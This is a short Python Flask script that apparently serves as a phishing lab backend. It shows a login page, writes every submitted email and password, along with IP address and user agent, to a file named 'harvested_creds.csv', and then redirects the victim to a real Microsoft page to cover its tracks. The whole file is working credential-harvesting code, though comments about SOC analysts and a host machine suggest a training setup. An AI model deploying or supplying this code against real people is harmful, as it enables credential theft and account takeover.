from flask import Flask, render_template, request, redirect
import csv
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    # Log when someone just visits the page
    print(f"[{datetime.now()}] Visit detected from: {request.remote_addr}")
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    # Capture the form data
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Capture telemetry (SOC Analysts love this data!)
    user_agent = request.headers.get('User-Agent')
    ip_address = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Save to our CSV "database"
    with open('harvested_creds.csv', 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Timestamp:',timestamp,'Email:', email,'Password:', password,'IP Address:', ip_address,'User Agent:', user_agent])
    
    print(f"[!] SUCCESS: Captured credentials for {email}")

    # Redirect the victim to a real page to hide our tracks
    return redirect("https://www.microsoft.com/en-us/security/business/security-101/what-is-phishing")

if __name__ == '__main__':
    # host='0.0.0.0' allows external devices (like your host machine) to connect
    app.run(host='0.0.0.0', port=5000)
